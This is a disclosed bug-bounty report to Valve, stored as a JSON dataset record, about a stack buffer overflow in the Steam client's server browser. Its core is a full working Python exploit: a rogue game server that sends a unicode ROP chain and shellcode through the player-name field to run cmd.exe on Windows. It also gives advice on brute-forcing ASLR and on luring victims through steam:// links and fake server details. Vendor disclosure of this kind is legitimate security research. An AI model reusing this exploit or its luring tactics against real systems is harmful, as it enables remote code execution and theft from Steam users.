{
    "reported_to": "Valve",
    "reported_by": "vinnievan ",
    "title": "RCE on Steam Client via buffer overflow in Server Info",
    "content": "\nIntroduction\nIn Steam and other valve games (CSGO, Half-Life, TF2) there is a functionality to find game servers called the server browser. In order to retrieve the information about these servers the server browser communicates with a specific UDP protocol called server queries. The protocol is well described in the online developers manual of Steam. We implemented a custom python server which only replies with the protocol using the same information available in the documentation. After a successful implementation of the protocol we fuzzed several parameters and noticed that the Steam client crashed when receiving replies from our custom server. More specifically, the client crashed when we replied with a large player name used in the A2S_PLAYER response. When attaching a debugger we noticed it crashed due to a stack-based buffer overflow.\nThis clearly indicates that something was wrong and we investigated it further to be able to exploit the buffer overflow. After further inspection, we noticed that the overflow occurred in the serverbrowser library. At some point the players\u2019 name is converted into unicode and an overflow occurs because the boundaries are not checked. Also, there\u2019s no canary protection present, which allowed us to overwrite the return address and execute arbitrary code on Windows.\nExploit details\nWe wanted to prove impact and build an exploit. First, we tested it on Linux and we were able to control the execution flow instantly by overwriting the return address. However, on Linux, we were able to control two bytes of the EIP register only (e.g. 0x00004141) and we didn\u2019t explore it further. On OSX, the process terminated with SIGABRT, which means that there\u2019s probably a canary protection in the library on OSX. Then, we tried to exploit it on Windows and we were successful (tested on Windows 8.1 and 10).\nOn Windows, sending a player name via UDP like A*1100 would result in the following stack layout:\nCode 25 Bytes\n10x00410041\n20x00410041\n3...\nThis happens due to unicode conversion (wide-char), because player names can use unicode characters. Sending a player name with unicode characters like u\"\\u4141\"*1100 would result in the following layout:\nCode 25 Bytes\n10x41414141\n20x41414141\n3...\nHowever, since we were corrupting the stack and registers before the function returns, we had no control over the EIP register yet. The program was crashing after dereferencing the edi register, but we had control over it. We satisfied these special conditions using constant values present on the Steam.exe binary:\n<image_0>\nThen, we built a unicode ROP chain with gadgets from Steam.exe only, to call VirtualProtect dynamically to make the stack executable and jump to our unicode shellcode to execute cmd.exe. This was a big challenge since we couldn't use values like 0x00000040 in our ROP chain, otherwise the string would be terminated. And we couldn't use invalid unicode characters like u\"\\uda01\" because the library replaces them with a question mark ? - 0x003F.\nNote: Everything is calculated using the Steam.exe base address. This address changes if you restart your Windows 8 or Windows 10, not if you relaunch Steam. The exploit is 100% reliable if you edit the base address on the exploit, but you can't predict the base address in the computer of a victim due to ASLR. However, we have two exploitation scenarios:\nOnly 9 bits are randomized: An attacker can successfully exploit a victim with a probability of 0.2% (1/512), which is more than enough if we are talking about an attacker distributing this exploit massively to all Steam users (1 new victim every 512 attempts in average)\nThis vulnerability can be chained with another memory leak vulnerability to make it 100% reliable\nSteps to reproduce\nFirst, make sure that you have Steam installed. If you are using the beta version, please uncomment the beta version gadgets in the exploit code.\n<image_1>\n4 - Run the exploit on a server of your choice (e.g. localhost): python steam_serverinfo_exploit.py\n5 - Edit POC.html and change the IP address of the server in the iframe src\n6 - Open it in a browser and wait for cmd.exe to be executed\n7 - You can also open the server browser in the menu (View > Servers) and click View server info to trigger the exploit (if you are running the server in the same network it will appear in the LAN section)\nPoC\nPOC.html (F395519)\nContains the html page code used in the SteamURL video.\nExploit code:\nCode 7.52 KiB\n1import logging\n2import socket\n3import textwrap\n4\n5\n6### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######\n7# More info: https://developer.valvesoftware.com/wiki/Server_queries\n8# Shellcode must contain valid unicode characters, pad with NOPs :)\n9\n10\n11STEAM_BASE = 0x01180000\n12\n13# Shellcode: open cmd.exe\n14shellcode = \"\\x31\\xc9\\x64\\x8b\\x41\\x30\\x8b\\x40\\x0c\\x8b\\x70\\x14\\xad\\x96\\xad\\x8b\\x58\\x10\\x8b\\x53\\x3c\\x01\\xda\\x90\\x8b\\x52\\x78\\x01\\xda\\x8b\\x72\\x20\\x90\\x01\\xde\\x31\\xc9\\x41\\xad\\x01\\xd8\\x81\\x38\\x47\\x65\\x74\\x50\\x75\\xf4\\x81\\x78\\x04\\x72\\x6f\\x63\\x41\\x75\\xeb\\x81\\x78\\x08\\x64\\x64\\x72\\x65\\x75\\xe2\\x8b\\x72\\x24\\x90\\x01\\xde\\x66\\x8b\\x0c\\x4e\\x49\\x8b\\x72\\x1c\\x01\\xde\\x8b\\x14\\x8e\\x90\\x01\\xda\\x31\\xf6\\x89\\xd6\\x31\\xff\\x89\\xdf\\x31\\xc9\\x51\\x68\\x61\\x72\\x79\\x41\\x68\\x4c\\x69\\x62\\x72\\x68\\x4c\\x6f\\x61\\x64\\x54\\x53\\xff\\xd2\\x83\\xc4\\x0c\\x31\\xc9\\x68\\x65\\x73\\x73\\x42\\x88\\x4c\\x24\\x03\\x68\\x50\\x72\\x6f\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\x31\\xff\\x89\\xc7\\xff\\xd6\\x83\\xc4\\x0c\\x31\\xc9\\x51\\x68\\x64\\x6c\\x6c\\x41\\x88\\x4c\\x24\\x03\\x68\\x6c\\x33\\x32\\x2e\\x68\\x73\\x68\\x65\\x6c\\x54\\x31\\xd2\\x89\\xfa\\x89\\xc7\\xff\\xd2\\x83\\xc4\\x0b\\x31\\xc9\\x68\\x41\\x42\\x42\\x42\\x88\\x4c\\x24\\x01\\x68\\x63\\x75\\x74\\x65\\x68\\x6c\\x45\\x78\\x65\\x68\\x53\\x68\\x65\\x6c\\x54\\x50\\xff\\xd6\\x83\\xc4\\x0d\\x31\\xc9\\x68\\x65\\x78\\x65\\x41\\x88\\x4c\\x24\\x03\\x68\\x63\\x6d\\x64\\x2e\\x54\\x59\\x31\\xd2\\x42\\x52\\x31\\xd2\\x52\\x52\\x51\\x52\\x52\\xff\\xd0\\xff\\xd7\"\n15\n16\n17def udp_server(host=\"0.0.0.0\", port=27015):\n18    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n19    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n20    print(\"[*] Starting TSQuery UDP server on host: %s and port: %s\" % (host, port))\n21    s.bind((host, port))\n22    while True:\n23        (data, addr) = s.recvfrom(128*1024)\n24        requestType = checkRequestType(data)\n25        if requestType == \"INFO\":\n26            response = createINFOReply()\n27        elif requestType == \"PLAYER\":\n28            response = createPLAYERReply()\n29            print(\"[+] Payload sent!\")\n30        else:\n31            response = 'nope'\n32        s.sendto(response,addr)\n33        yield data\n34\n35\n36def checkRequestType(data):\n37    # Header byte contains the type of request\n38    header = data[4]\n39    if header == \"\\x54\":\n40        print(\"[*] Received A2S_INFO request\")\n41        return \"INFO\"\n42    elif header == \"\\x55\":\n43        print(\"[*] Received A2S_PLAYER request\")\n44        return \"PLAYER\"\n45    else:\n46        print \"Unknown request\"\n47        return \"UNKNOWN\"\n48\n49\n50def createINFOReply():\n51    # A2S_INFO response\n52    # Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.\n53    pre = \"\\xFF\\xFF\\xFF\\xFF\"                         # Pre (4 bytes)\n54    header = \"\\x49\"                                  # Header (1 byte)\n55    protocol = \"\\x02\"                                # Protocol version (1 byte)\n56    name = \"@Kernelpanic and @0xacb Server\" + \"\\x00\" # Server name (string)\n57    map_name = \"de_dust2\" + \"\\x00\" # Map name (string)\n58    folder = \"csgo\" + \"\\x00\" # Name of the folder contianing the game files (string)\n59    game = \"Counter-Strike: Global Offensive\" + \"\\x00\" # Game name (string)\n60    ID = \"\\xda\\x02\" # Game ID (short)\n61    players = \"\\xFF\" # Amount of players in the server (byte)\n62    maxplayers = \"\\xFF\" # Max player allowed (byte)\n63    bots = \"\\x00\" # Bots in game (byte)\n64    server_type = \"d\" # Server type, d = dedicate (byte)\n65    environment = \"l\" # Hosted on windows linux or mac, l is linux (byte)\n66    visibility = \"\\x00\" # Password needed? (byte)\n67    VAC = \"\\x01\" # VAC enabled? (byte)\n68    version = \"1.3.6.7.1\\x00\"\n69    return pre + header + protocol + name + map_name + folder + game + ID + players + maxplayers + bots + server_type + environment + visibility + VAC + version\n70\n71\n72def to_unicode(addr):\n73    a = addr & 0xffff;\n74    b = addr >> 16;\n75    return eval('u\"\\\\u%s\\\\u%s\"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))\n76\n77\n78def convert_addr(gadget):\n79    return to_unicode(STEAM_BASE + gadget - 0x400000)\n80\n81\n82def convert_shellcode(code):\n83    code = code + \"\\x90\"*8 #pad with nops\n84    output = \"\"\n85    l = textwrap.wrap(code.encode(\"hex\"), 2)\n86    for i in range(0, len(l)-4, 4):\n87        output += \"\\\\u%s%s\\\\u%s%s\" % (l[i+1], l[i], l[i+3], l[i+2])\n88    return eval('u\"%s\"' % output)\n89\n90\n91def pwn():\n92    print(\"[*] Building ROP chain\")\n93\n94    # ROP gadgets for Steam.exe Nov 26 2018\n95    pop_eax = convert_addr(0x503ca7)\n96    pop_ecx = convert_addr(0x41bd9f)\n97    pop_edx = convert_addr(0x413a53)\n98    pop_ebx = convert_addr(0x40511c)\n99    pop_ebp = convert_addr(0x40247c)\n100    pop_esi = convert_addr(0x404de6)\n101    pop_edi = convert_addr(0x423839)\n102    jmp_esp = convert_addr(0x4413bd)\n103    pushad = convert_addr(0x425e00)\n104    ret_nop = convert_addr(0x401212)\n105    mov_edx_eax = convert_addr(0x5599a6)\n106    sub_eax_41e82c6a = convert_addr(0x51584f)\n107    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e24eb)\n108    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)\n109    xchg_eax_esi = convert_addr(0x543b86)\n110\n111    writable_addr = convert_addr(0x69a01c)\n112    virtual_protect_idata = convert_addr(0x5f9280)\n113    new_protect = to_unicode(0x41e82c6a+0x40)\n114    msize = to_unicode(0x41e82c6a+0x501)\n115\n116    '''\n117    # ROP gadgets for Steam.exe Beta Dec 14 2018\n118    pop_eax = convert_addr(0x425993)\n119    pop_ecx = convert_addr(0x41bd9f)\n120    pop_edx = convert_addr(0x413a53)\n121    pop_ebx = convert_addr(0x40511c)\n122    pop_ebp = convert_addr(0x40247c)\n123    pop_esi = convert_addr(0x404de6)\n124    pop_edi = convert_addr(0x423839)\n125    jmp_esp = convert_addr(0x4413bd)\n126    pushad = convert_addr(0x425e00)\n127    ret_nop = convert_addr(0x401212)\n128    mov_edx_eax = convert_addr(0x559d46)\n129    sub_eax_31e82c6a = convert_addr(0x515bbf)\n130    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e284b)\n131    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)\n132    xchg_eax_esi = convert_addr(0x515b5e)\n133\n134    writable_addr = convert_addr(0x69a01c)\n135    virtual_protect_idata = convert_addr(0x5fa280)\n136    new_protect = to_unicode(0x31e82c6a+0x40)\n137    msize = to_unicode(0x31e82c6a+0x501)\n138    '''\n139\n140    rop = pop_eax + msize + sub_eax_41e82c6a + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret \\\n141              + u\"\\ub33f\\ubeef\" + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret + ret_nop*0x10 \\\n142              + pop_ecx + writable_addr \\\n143              + pop_eax + new_protect + sub_eax_41e82c6a + mov_edx_eax \\\n144              + pop_ebp + jmp_esp + pop_esi + virtual_protect_idata \\\n145              + mov_esi_ptr_esi_mov_eax_esi_pop_esi + u\"\\ub33f\\ubeef\" + xchg_eax_esi + pop_edi \\\n146              + ret_nop + pop_eax + u\"\\u9090\\u9090\" + pushad\n147\n148    #special conditions to avoid crashes\n149    special_condition_1 = to_unicode(STEAM_BASE + 0x10)\n150    special_condition_2 = to_unicode(STEAM_BASE + 0x11)\n151    payload = \"A\"*1024 + u\"\\ub33f\\ubeef\"*12 + special_condition_1 + special_condition_2*31 + rop + shellcode\n152    return payload.encode(\"utf-8\") + \"\\x00\"\n153\n154\n155def createPLAYERReply():\n156    # A2S_player response\n157    # This query retrieves information about the players currently on the server.\n158    pre = \"\\xFF\\xFF\\xFF\\xFF\"                        # Pre (4 bytes)\n159    header = \"\\x44\"                                 # Header (1 byte)\n160    players = \"\\x01\"                                # Amount of players (1 byte)\n161    indexPlayer1 = \"\\x01\"                           # Index of player (1 byte)\n162\n163    namePlayer2 = pwn()\n164    scorePlayer2 = \"\"\n165    durationPlayer2  = \"\"\n166    return pre + header + players + indexPlayer1 + namePlayer2 + scorePlayer2 + durationPlayer2\n167\n168\n169FORMAT_CONS = '%(asctime)s %(name)-12s %(levelname)8s\\t%(message)s'\n170logging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)\n171\n172if __name__ == \"__main__\":\n173    shellcode = convert_shellcode(shellcode)\n174    for data in udp_server():\n175        pass\nImpact\nAn attacker can execute arbitrary code on the computer of any Steam user who views the server info of our malicious server. Usually an attacker would initiate a backdoor connection to a C2 infrastructure to gain access to the computer of the victim. From there on an attacker could do whatever he/she wants (e.g. account takeover, steal all items from the steam account, install additional malware in the OS, exfiltrate documents, etc.)\nThere are several ways to trick a user into running the exploit:\nUser views the Server Info in the Steam client server browser\nUser visits a malicious web page of an attacker where a Steam browser protocol request is initiated: steam://connect/1.2.3.4\nAdditionally there are a few ways that increase the likelihood of this attack:\nIt can be triggered via a website using the steam browser protocol\nLots of users don\u2019t need to click the Open Steam button on the browser (Always open these types of links in the associated app \u2713)\nThe first Info Reply that doesn\u2019t contain the exploit can have interesting values to trick the user.\nThe server name can be chosen and can trick the user to use the server\nBy setting the current amount of players high people are more likely to join\nMap name could also contain interesting text as values to lure people\nIf the amount of players in the server is equal the maximum allowed players in the server then the server info box is automatically opened and the exploit executes successfully after the first automatic refresh\nThe server name can be chosen and can trick the user to use the server\nBy setting the current amount of players high people are more likely to join\nMap name could also contain interesting text as values to lure people\nIf the amount of players in the server is equal the maximum allowed players in the server then the server info box is automatically opened and the exploit executes successfully after the first automatic refresh\nBest regards,\nVinnie Vanhoecke @vinnievan and Andr\u00e9 Baptista @0xacb\n\n",
    "severity": [
        9.6,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Classic Buffer Overflow"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/516/c8f7444bdc7ca233ec1436d373188d567b3cdb49/special_condition.png?response-content-disposition=attachment%3B%20filename%3D%22special_condition.png%22%3B%20filename%2A%3DUTF-8%27%27special_condition.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYN2EPGHR%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T045325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC1H419oM2x8L8F9k1w3sddJCRKSjNna4vbuFcKcCFebwIgXc0v4N92Vid6uRau%2BDfAzu7dFyebcapOXGeZFAP%2Fxd8qsQUIJRADGgwwMTM2MTkyNzQ4NDkiDHcdRq0ZObis1iQTMyqOBf7aT9koJtzz4zmDY61xh4c3FwEmntpYAb0fXrPmH79tHty0JwyKf9rK%2BTcXguxSrQoTGPgGWWtrJNCSnFy%2Bx9AvxbEZdsWHBG6DZCU0Ux%2Fxth2GQ%2BRkzo%2FtzBMBB7acTpK1hGjIeleyQYtwDdfKEetIddp0rRmHojORb7IREM2RuVbCmt2B89m%2BpLQbu73VtLLWlVmEsg%2Ba7FCAVAhmd%2FSXurZzF5YyvUHhhUPoGXO8G93riHxqfdJRf2QdhLhbrZqVhlTWV4mJnkUFuNMJKEEc4It%2BJ6D23gQhSrt%2FKlsMMyOEI8mSybppGKCt1yLzPqdBhZCmpyZLzQTufK1kY7IHYgMJ40Wjp0MrC8xVFwunv2%2FNlUfeual%2BzuQjw7CR4BhlGVrdA%2Bel2L3i8w6QNr83cwDL5T6ls5Sue1gHjdkfSszgBzBtVMiwJZwmL2%2BvMS%2FlG%2FimhQWtx2akC4HNs0pGLDK44UWUsSMYCPy2drqvhO%2FwTd%2F4uRe4ic418jX6wwC7clziT9yJjiXx%2FqTt3174d2Zdqm2xuZtcyr9mNLJwP9XcodgldaWnP7u%2BsVcO33raz0toQ1X6xZbY4wBwQUUHUm6NF%2BWc2%2FgcoJLqo9Cj7h22lZapPWlV6HRvtq2Lge%2BNeAL71el1s69GSzLth%2Bvk4VtG52KZbQ8uuy2D%2BcvGKJta6UPs1P593ZATnMX9oLeK%2BMLVO73vqC5OvdSOf0EtPcag18qbKzePTjK2hRBRsNwEMfQsgY0NP3Oi5Gp7cR%2BO3aM55j08FKYNwzGu4N0Lm8b6X9BHgeA1I1z4cAww%2BCEpNvDucHvCO9udYaj1meFdscGPwbYoq4shIljRL3lK58gRTImQacVUDXVNpDDr%2Fo2%2FBjqxASMugYiA419WvhkWxPjaqKi%2Fs2ZsyBbjjSihR2tz1ko3BsICo2ylSEOy%2BvjGNCw6U8mLk%2FVUkq2c8d9OSxtEs%2FB64epetRCyjfQY%2FK%2F1Gs%2BAGDyrmoMJs6k9%2F0EwurzWYN43SrLEWpxOGcAn65AcnfIDK%2BSDY29jAU4lBsiKKgI30GvQ%2B3x2xnX9tbBwsP1o0DVmjgiKGmfpUKuyXSTzZ70EAxCYJY0YFDdiFyMCoZcuyQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ffa4aa696ae9102de42a810af44588aead55d7482007f10d4ef18292a1515d9",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/520/f355b4eeae660a367a98bb2e801f37ca5a845725/steam_base_address.png?response-content-disposition=attachment%3B%20filename%3D%22steam_base_address.png%22%3B%20filename%2A%3DUTF-8%27%27steam_base_address.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYN2EPGHR%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T045325Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC1H419oM2x8L8F9k1w3sddJCRKSjNna4vbuFcKcCFebwIgXc0v4N92Vid6uRau%2BDfAzu7dFyebcapOXGeZFAP%2Fxd8qsQUIJRADGgwwMTM2MTkyNzQ4NDkiDHcdRq0ZObis1iQTMyqOBf7aT9koJtzz4zmDY61xh4c3FwEmntpYAb0fXrPmH79tHty0JwyKf9rK%2BTcXguxSrQoTGPgGWWtrJNCSnFy%2Bx9AvxbEZdsWHBG6DZCU0Ux%2Fxth2GQ%2BRkzo%2FtzBMBB7acTpK1hGjIeleyQYtwDdfKEetIddp0rRmHojORb7IREM2RuVbCmt2B89m%2BpLQbu73VtLLWlVmEsg%2Ba7FCAVAhmd%2FSXurZzF5YyvUHhhUPoGXO8G93riHxqfdJRf2QdhLhbrZqVhlTWV4mJnkUFuNMJKEEc4It%2BJ6D23gQhSrt%2FKlsMMyOEI8mSybppGKCt1yLzPqdBhZCmpyZLzQTufK1kY7IHYgMJ40Wjp0MrC8xVFwunv2%2FNlUfeual%2BzuQjw7CR4BhlGVrdA%2Bel2L3i8w6QNr83cwDL5T6ls5Sue1gHjdkfSszgBzBtVMiwJZwmL2%2BvMS%2FlG%2FimhQWtx2akC4HNs0pGLDK44UWUsSMYCPy2drqvhO%2FwTd%2F4uRe4ic418jX6wwC7clziT9yJjiXx%2FqTt3174d2Zdqm2xuZtcyr9mNLJwP9XcodgldaWnP7u%2BsVcO33raz0toQ1X6xZbY4wBwQUUHUm6NF%2BWc2%2FgcoJLqo9Cj7h22lZapPWlV6HRvtq2Lge%2BNeAL71el1s69GSzLth%2Bvk4VtG52KZbQ8uuy2D%2BcvGKJta6UPs1P593ZATnMX9oLeK%2BMLVO73vqC5OvdSOf0EtPcag18qbKzePTjK2hRBRsNwEMfQsgY0NP3Oi5Gp7cR%2BO3aM55j08FKYNwzGu4N0Lm8b6X9BHgeA1I1z4cAww%2BCEpNvDucHvCO9udYaj1meFdscGPwbYoq4shIljRL3lK58gRTImQacVUDXVNpDDr%2Fo2%2FBjqxASMugYiA419WvhkWxPjaqKi%2Fs2ZsyBbjjSihR2tz1ko3BsICo2ylSEOy%2BvjGNCw6U8mLk%2FVUkq2c8d9OSxtEs%2FB64epetRCyjfQY%2FK%2F1Gs%2BAGDyrmoMJs6k9%2F0EwurzWYN43SrLEWpxOGcAn65AcnfIDK%2BSDY29jAU4lBsiKKgI30GvQ%2B3x2xnX9tbBwsP1o0DVmjgiKGmfpUKuyXSTzZ70EAxCYJY0YFDdiFyMCoZcuyQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb78cf9a0caae36a6844aa4ce04f319e5f8497cf41c94a20a3906dd039c83383"
    },
    "disclosed_date": 1552693620,
    "report_url": "https://hackerone.com/reports/470520",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Implement a custom Python server that mimics the Steam server query protocol."
        ],
        [
            2,
            "Fuzz the server responses, particularly focusing on the player name field in the A2S_PLAYER response to trigger a buffer overflow."
        ],
        [
            3,
            "Analyze the crash in the Steam client to identify the stack-based buffer overflow vulnerability in the serverbrowser library."
        ],
        [
            4,
            "Develop an exploit by crafting a malicious player name that overflows the buffer and overwrites the return address to execute arbitrary code."
        ],
        [
            5,
            "Test the exploit on different operating systems (Linux, OSX, Windows) and refine it for Windows where the exploit is successful."
        ],
        [
            6,
            "Create a proof-of-concept (PoC) HTML page that uses the Steam browser protocol to trigger the exploit when a user views server info."
        ]
    ],
    "vuln_description": "The vulnerability is a stack-based buffer overflow in the Steam client's serverbrowser library, triggered by a specially crafted player name in the A2S_PLAYER response. This allows an attacker to overwrite the return address and execute arbitrary code on the victim's machine.",
    "reason": "This vulnerability involves multiple components including the Steam client, server query protocol, and a custom server. The attacker must understand the protocol, fuzz the client, analyze the crash, and develop a ROP chain to bypass protections like ASLR. The interaction between the unicode conversion and buffer overflow is subtle and non-obvious.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}